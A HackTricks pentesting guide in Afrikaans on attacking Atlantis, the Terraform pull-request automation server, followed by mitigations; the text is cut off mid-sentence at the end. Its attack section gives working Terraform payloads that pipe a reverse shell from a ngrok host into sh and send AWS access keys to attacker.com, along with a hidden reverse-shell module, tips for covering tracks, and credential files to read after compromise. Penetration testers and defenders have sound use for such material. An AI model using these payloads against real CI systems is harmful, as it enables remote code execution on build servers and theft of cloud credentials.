# Atlantis Security

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Basiese Inligting

Atlantis help jou basies om terraform vanaf Pull Requests vanaf jou git-bediener uit te voer.

![](<../.gitbook/assets/image (51).png>)

## Plaaslike Laboratorium

1. Gaan na die **atlantis vrystellingsbladsy** by [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) en **laai** die een af wat by jou pas.
2. Skep 'n **persoonlike token** (met repo-toegang) van jou **github**-gebruiker.
3. Voer `./atlantis testdrive` uit en dit sal 'n **demonstrasie-opslagplaas** skep wat jy kan gebruik om met atlantis te **praat**.
4. Jy kan die webblad besoek by 127.0.0.1:4141.

## Atlantis Toegang

### Git-bedienerlegitimasie

**Atlantis** ondersteun verskeie git-gashere soos **Github**, **Gitlab**, **Bitbucket** en **Azure DevOps**.\
Om egter toegang tot die opslagplase in hierdie platforms te verkry en aksies uit te voer, moet daar enige **bevoorregte toegang aan hulle verleen word** (ten minste skryftoestemmings).\
[**Die dokumentasie**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) moedig aan om 'n gebruiker in hierdie platforms spesifiek vir Atlantis te skep, maar sommige mense mag persoonlike rekeninge gebruik.

{% hint style="warning" %}
In elk geval, vanuit 'n aanvaller se perspektief, gaan die **Atlantis-rekening** baie **interessant** wees **om te kompromitteer**.
{% endhint %}

### Webhooks

Atlantis gebruik opsioneel [**Webhook-geheime**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) om te bevestig dat die **webhooks** wat dit van jou Git-bediener ontvang, **geldig** is.

Een manier om dit te bevestig, sou wees om **versoeke slegs vanaf die IP-adresse** van jou Git-bediener toe te laat, maar 'n makliker manier is om 'n Webhook-geheim te gebruik.

Let daarop dat jy, tensy jy 'n private github- of bitbucket-bediener gebruik, die webhook-eindpunte aan die internet moet blootstel.

{% hint style="warning" %}
Atlantis gaan **webhooks blootstel** sodat die git-bediener dit inligting kan stuur. Vanuit 'n aanvaller se perspektief sou dit interessant wees om te weet **of jy dit kan stuur**.
{% endhint %}

### Verskafferlegitimasie <a href="#provider-credentials" id="provider-credentials"></a>

[Volgens die dokumentasie:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis voer Terraform uit deur eenvoudigweg die `terraform plan` en `apply`-opdragte op die bediener uit waarop Atlantis gehuisves is. Net soos wanneer jy Terraform plaaslik uitvoer, benodig Atlantis legitimasie vir jou spesifieke verskaffer.

Dit is aan jou hoe jy [legitimasie voorsien](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) vir jou spesifieke verskaffer aan Atlantis:

* Die Atlantis [Helm-grafiek](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) en [AWS Fargate-module](https://www.runatlantis.io/docs/deployment.html#aws-fargate) het hul eie meganismes vir verskafferlegitimasie. Lees hul dokumentasie.
* As jy Atlantis in 'n wolk uitvoer, het baie wolke maniere om wolk-API-toegang aan toepassings wat op hulle uitgevoer word, te gee, bv.:
* [AWS EC2-rolle](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Soek na "EC2 Role")
* [GCE-instansiediensrekeninge](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Baie gebruikers stel omgewingsveranderlikes in, bv. `AWS_ACCESS_KEY`, waar Atlantis uitgevoer word.
* Ander skep die nodige konfigurasie l√™ers, bv. `~/.aws/credentials`, waar Atlantis uitgevoer word.
* Gebruik die [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) om verskafferlegitimasie te verkry.

{% hint style="warning" %}
Die **houer** waarin **Atlantis** **uitgevoer** word, sal waarskynlik **bevoorregte legitimasie** vir die verskaffers (AWS, GCP, Github...) bevat wat Atlantis via Terraform bestuur.
{% endhint %}

### Webblad

Standaard sal Atlantis 'n **webblad op poort 4141 in die plaaslike omgewing** uitvoer. Hierdie bladsy stel jou net in staat om atlantis apply aan en af te skakel en die planstatus van die opslagplase te kontroleer en hulle te ontgrendel (dit maak nie wysigings moontlik nie, so dit is nie baie nuttig nie).

Jy sal dit waarskynlik nie aan die internet blootgestel vind nie, maar dit lyk asof **geen legitimasie standaard nodig is** om dit te benader (en as dit wel nodig is, is `atlantis`:`atlantis` die **standaard** een).

## Bedienerkonfigurasie

Konfigurasie vir `atlantis server` kan gespesifiseer word deur middel van opdragre√´l-vlae, omgewingsveranderlikes, 'n konfigurasie-l√™er of 'n kombinasie van die drie.

* Jy kan [**hier die lys vlae**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) vind wat deur Atlantis-bedieners ondersteun word.
* Jy kan [**hier sien hoe om 'n konfigurasie-opsie in 'n omgewingsveranderlike te omskep**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables).

Waardes word **in hierdie volgorde gekies**:

1. Vlae
2. Omgewingsveranderlikes
3. Konfigurasie-l√™er

{% hint style="warning" %}
Let daarop dat jy in die konfigurasie interessante waardes soos **tokens en wagwoorde** kan vind.
{% endhint %}

### Opstalingskonfigurasie

Sommige konfigurasies be√Ønvloed **hoe die opslagplase bestuur word**. Dit is egter moontlik dat **elke opslagplek verskillende instellings vereis**, dus is daar maniere om elke opslagplek te spesifiseer. Dit is die prioriteitsvolgorde:

1. Opstalingsl√™er [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config). Hierdie l√™er kan gebruik word om te spesifiseer hoe atlantis die opslagplek moet hanteer. Sommige sleutels kan egter nie hier gespesifiseer word sonder dat sekere vlae dit toelaat nie.
2. Waarskynlik vereis om deur vlae soos `allowed_overrides` of `allow_custom_workflows` toegelaat te word
3. \[**Bedienerkant-konfigurasie**]\(https://www.runatlantis.io/docs/server-side-re

#### PR Beskerming

Atlantis maak dit moontlik om aan te dui of jy wil h√™ die **PR** deur iemand anders **`goedgekeur`** moet word (selfs as dit nie in die takbeskerming ingestel is nie) en/of **`saamvoegbaar`** moet wees (takbeskerming geslaag) **voordat apply uitgevoer word**. Vanuit 'n veiligheidsoogpunt word dit aanbeveel om beide opsies in te stel.

In die geval dat `allowed_overrides` waar is, kan hierdie instelling **oor geskryf word op elke projek deur die `/atlantis.yml` l√™er**.

#### Skripte

Die repo-konfigurasie kan **skripte spesifiseer** om uit te voer [**voor**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) en [**na**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) 'n **werkstroom uitgevoer word**.

Daar is geen opsie om hierdie skripte in die **repo `/atlantis.yml`** l√™er te spesifiseer nie.

#### Werkstroom

In die repo-konfigurasie (bedienerkant-konfigurasie) kan jy [**'n nuwe verstek-werkstroom spesifiseer**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), of [**nuwe aangepaste werkstrome skep**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Jy kan ook **spesifiseer** watter **repos** toegang kan h√™ tot die **nuwe** gegenereerde werkstrome.\
Daarna kan jy die **atlantis.yaml** l√™er van elke repo toelaat om die werkstroom te **spesifiseer wat gebruik moet word.**

{% hint style="danger" %}
As die [**bedienerkant-konfigurasie**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) vlag `allow_custom_workflows` op **True** ingestel is, kan werkstrome **gespesifiseer** word in die **`atlantis.yaml`** l√™er van elke repo. Dit is ook moontlik dat **`allowed_overrides`** ook **`workflow`** moet spesifiseer om die werkstroom wat gebruik gaan word, te **oor skryf**.\
Dit sal basies **RCE in die Atlantis-bedieners aan enige gebruiker wat toegang tot daardie repo het, gee**.

```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Conftest-beleidskontrole

Atlantis ondersteun die uitvoering van **bedienerkant** [**conftest**](https://www.conftest.dev/) **beleide** teen die planuitset. Algemene gevalle waarin hierdie stap gebruik word, sluit in:

* Die verbieding van die gebruik van 'n lys modules
* Die bewering van eienskappe van 'n hulpbron tydens skepping
* Die opsporing van onbedoelde hulpbronverwyderings
* Die voorkoming van sekuriteitsrisiko's (bv. die blootstelling van veilige poorte aan die publiek)

U kan sien hoe om dit te konfigureer in [**die dokumentasie**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

## Atlantis-opdragte

[**In die dokumentasie**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) kan u die opsies vind wat u kan gebruik om Atlantis uit te voer:

```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```

## Aanvalle

{% hint style="warning" %}
As jy tydens die uitbuiting hierdie **fout** vind: `Fout: Fout by die verkryging van die toestandsluit`

Jy kan dit regmaak deur die volgende uit te voer:

```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis-plan RCE - Konfigurasie wysiging in nuwe PR

As jy skryftoegang het tot 'n herpositorium, kan jy 'n nuwe tak daarop skep en 'n PR genereer. As jy **`atlantis plan` kan uitvoer** (of dalk word dit outomaties uitgevoer), **kan jy RCE binne die Atlantis-bediener uitvoer**.

Jy kan dit doen deur [**Atlantis om 'n eksterne data-bron te laat laai**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Plaas net 'n lading soos die volgende in die `main.tf`-l√™er:

```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```

#### Steelsmoeliger Aanval

Jy kan selfs 'n **steelsmoeliger aanval** uitvoer deur hierdie voorstelle te volg:

* In plaas daarvan om die omgekeerde skul in die terraform-l√™er direk by te voeg, kan jy 'n **eksterne bron** laai wat die omgekeerde skul bevat:

```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```

Jy kan die omgekeerde skulpskakel-kode vind by [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* In die eksterne bron, gebruik die **ref** funksie om die **terraform omgekeerde skulpskakel-kode in 'n tak** binne die repo te versteek, iets soos: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **In plaas daarvan** om 'n **PR na meester** te skep om Atlantis te aktiveer, **skep 2 takke** (test1 en test2) en skep 'n **PR van een na die ander**. Wanneer jy die aanval voltooi het, **verwyder net die PR en die takke**.

### Atlantis plan Geheime Uitlek

Jy kan **geheime wat deur terraform gebruik word uitlek** deur `atlantis plan` (`terraform plan`) uit te voer deur iets soos dit in die terraform-l√™er te plaas:

```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```

### Atlantis pas RCE toe - Konfigurasiewysiging in nuwe PR

As jy skryftoegang het tot 'n herpositorium, sal jy 'n nuwe tak daarop kan skep en 'n PR genereer. As jy **`atlantis apply` kan uitvoer, sal jy binne die Atlantis-bediener RCE kan toepas**.

Tog sal jy gewoonlik sekere beskermings moet omseil:

* **Mergeable**: As hierdie beskerming in Atlantis ingestel is, kan jy slegs **`atlantis apply` uitvoer as die PR mergeable is** (wat beteken dat die takbeskerming omseil moet word).
* Kontroleer potensi√´le [**takbeskermingsomseilings**](https://github.com/carlospolop/hacktricks-cloud/blob/af/pentesting-ci-cd/broken-reference/README.md)
* **Goedgekeur**: As hierdie beskerming in Atlantis ingestel is, moet **'n ander gebruiker die PR goedkeur** voordat jy `atlantis apply` kan uitvoer.
* Standaard kan jy die [**Gitbot-token misbruik om hierdie beskerming te omseil**](https://github.com/carlospolop/hacktricks-cloud/blob/af/pentesting-ci-cd/broken-reference/README.md)

Voer **`terraform apply` uit op 'n skadelike Terraform-l√™er met** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Jy moet net verseker dat 'n sekere nutslading soos die volgende in die `main.tf`-l√™er eindig:

```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```

Volg die **voorstellings van die vorige tegniek** om hierdie aanval op 'n **meer verborge manier** uit te voer.

### Terraform Param-injectie

Wanneer jy `atlantis plan` of `atlantis apply` hardloop, word terraform onderliggend uitgevoer. Jy kan bevele aan terraform deurgee vanaf atlantis deur iets soos die volgende te kommentaar:

```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```

Iets wat jy kan deurgee is omgewingsveranderlikes wat nuttig kan wees om sekere beskermings te omseil. Kyk na terraform omgewingsveranderlikes in [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Aangepaste Werkvloei

Die uitvoering van **skadelike aangepaste bou-opdragte** wat gespesifiseer is in 'n `atlantis.yaml` l√™er. Atlantis gebruik die `atlantis.yaml` l√™er van die aftrekversoek-tak, **nie** van `master`.\
Hierdie moontlikheid is in 'n vorige afdeling genoem:

{% hint style="danger" %}
As die [**bedienerkant-konfigurasie**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) vlag `allow_custom_workflows` op **True** ingestel is, kan werkvloei in die **`atlantis.yaml`** l√™er van elke repo **gespesifiseer** word. Dit is ook moontlik dat **`allowed_overrides`** ook **`workflow`** moet spesifiseer om die werkvloei wat gebruik gaan word, te **oorheers**.

Dit sal basies **RCE in die Atlantis-bedieners aan enige gebruiker wat toegang tot daardie repo het**, gee.

```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Bypass plan/apply beskerming

As die [**bedienerkant-konfigurasie**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) vlag `allowed_overrides` geconfigureer is met `apply_requirements`, is dit moontlik vir 'n repo om die plan/apply beskerming te omseil en dit te ignoreer.

```yaml
repos:
- id: /.*/
apply_requirements: []
```

### PR Ontvoering

As iemand **`atlantis plan/apply` kommentaar op jou geldige pull requests stuur,** sal dit veroorsaak dat terraform loop wanneer jy dit nie wil h√™ nie.

Verder, as jy nie **takbeskerming** geconfigureer het om te vra om **heroorweging** van elke PR wanneer 'n **nuwe commit daarna gestuur word nie**, kan iemand kwaadwillige konfigurasies (kyk na vorige scenario's) in die terraform-konfigurasie skryf, `atlantis plan/apply` uitvoer en RCE verkry.

Dit is die **instelling** in Github takbeskerming:

![](<../.gitbook/assets/image (31).png>)

### Webhook-geheim

As jy daarin slaag om die gebruikte webhook-geheim te **steel** of as daar **geen webhook-geheim** gebruik word nie, kan jy die Atlantis-webhook **oproep** en atlantis-opdragte direk **aanroep**.

### Bitbucket

Bitbucket Cloud ondersteun **nie webhook-geheime nie**. Dit kan aanvallers in staat stel om vervalsde versoeke vanaf Bitbucket te **spoof**. Maak seker dat jy slegs Bitbucket IP-adresse toelaat.

* Dit beteken dat 'n **aanvaller** valse versoeke aan Atlantis kan maak wat lyk asof dit van Bitbucket afkomstig is.
* As jy `--repo-allowlist` spesifiseer, kan hulle slegs valse versoeke maak wat betrekking het op daardie repos, sodat die meeste skade wat hulle kan aanrig, is om plan/apply op jou eie repos uit te voer.
* Om dit te voorkom, moet jy [Bitbucket se IP-adresse](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (sien Uitgaande IPv4-adresse) toelaat (allowlist).

## Post-Exploitation

As jy toegang tot die bediener verkry het of ten minste 'n LFI het, is daar 'n paar interessante dinge wat jy moet probeer lees:

* `/home/atlantis/.git-credentials` Bevat vcs-toegangsertifikate
* `/atlantis-data/atlantis.db` Bevat vcs-toegangsertifikate met meer inligting
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform-staatl√™er
* Voorbeeld: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Omgewingsveranderlikes
* `/proc/[2-20]/cmdline` Opdraglyn van `atlantis server` (kan sensitiewe data bevat)

## Versagtings

### Moenie op openbare repos gebruik nie <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Omdat enigiemand kommentaar kan lewer op openbare pull requests, selfs met al die beskikbare veiligheidsversagtings, is dit steeds gevaarlik om Atlantis op openbare repos te laat loop sonder behoorlike konfigurasie van die veiligheidsinstellings.

### Moenie `--allow-fork-prs` gebruik nie <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

As jy op 'n openbare repo loop (wat nie aanbeveel word nie, sien hierbo) moet jy nie `--allow-fork-prs` instel (verstekwaarde is vals) nie, omdat enigiemand 'n pull request vanaf hul vurk na jou repo kan oopmaak.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis vereis dat jy 'n lys van toegelate repositoriums spesifiseer waarvandaan dit webhooks sal aanvaar deur middel van die `--repo-allowlist` vlag. Byvoorbeeld:

* Spesifieke repositoriums: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Jou hele organisasie: `--repo-allowlist=github.com/runatlantis/*`
* Elke repositorium in jou GitHub Enterprise-installasie: `--repo-allowlist=github.yourcompany.com/*`
* Alle repositoriums: `--repo-allowlist=*`. Nuttig as jy in 'n beskermde netwerk is, maar gevaarlik sonder om ook 'n webhook-geheim in te stel.

Hierdie vlag verseker dat jou Atlantis-installasie nie gebruik word met repositoriums wat jy nie beheer nie. Sien `atlantis server --help` vir meer besonderhede.

### Beskerm Terraform-beplanning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

As aanvallers pull requests met kwaadwillige Terraform-kode indien, moet jy bewus wees dat `terraform apply` goedkeurings nie genoeg is nie. Dit is moontlik om kwaadwillige kode in 'n `terraform plan` uit te voer deur die [`external` data bron](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) te gebruik of deur 'n kwaadwillige verskaffer te spesifiseer. Hierdie kode kan dan jou geloofsbriewe uitlek.

Om dit te voorkom, kan jy:

1. Verskaffers in die Atlantis-beeld insluit of in produksie uitgaande verkeer verbied.
2. Die verskafferregisterprotokol intern implementeer en openbare uitgaande verkeer verbied, sodat jy beheer oor skryftoegang tot die register het.
3. Jou [bedienerkant-repo-konfigurasie](https://www.runatlantis.io/docs/server-side-repo-config.html)'s `plan`-stap wysig om teen die gebruik van verbode verskaffers of data-bronne of PR's van nie-toegelate gebruikers te valideer. Jy kan ook by hierdie punt ekstra validering toevoeg, byvoorbeeld 'n "duim-op" op die PR vereis voordat die `plan` kan voortgaan. Conftest kan hier nuttig wees.

### Webhook-geheime <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis moet uitgevoer word met Webhook-geheime wat ingestel is deur middel van die `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` omgewingsveranderlikes. Selfs met die `--repo-allowlist`-vlag ingestel, sonder 'n webhook-geheim kan aanvallers versoeke aan Atlantis maak wat voorgee dat dit van 'n toegelate repositorium afkomstig is. Webhook-geheime verseker dat die webhook-versoeke werklik van jou VCS-verskaffer (GitHub of GitLab) afkomstig is.

As jy Azure DevOps gebruik, voeg 'n basiese gebruikersnaam en wagwoord by in plaas van webhook-geheime.

### Azure DevOps Basiese Verifikasie <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps ondersteun die stuur van 'n basiese verifikasie-kop in alle webhook-gebeure. Dit vereis dat jy 'n HTTPS-URL vir jou webhook-posisie gebruik.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

As jy webhook-geheime gebruik, maar jou verkeer oor HTTP plaasvind, kan die webhook-geheime gesteel word. Skakel SSL/HTTPS in deur die `--ssl-cert-file`- en `--ssl-key-file`-vlakke te gebruik.

### Skakel Verifikasie op Atlantis-webbediener in <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Dit word sterk aanbeveel om verifikasie in die webdiens in te skakel. Skakel BasicAuth in deur die `--web-basic-auth=true` te gebruik en stel 'n gebruikersnaam en wagwoord op met die `--web-username=yourUsername` en \`--web-password=
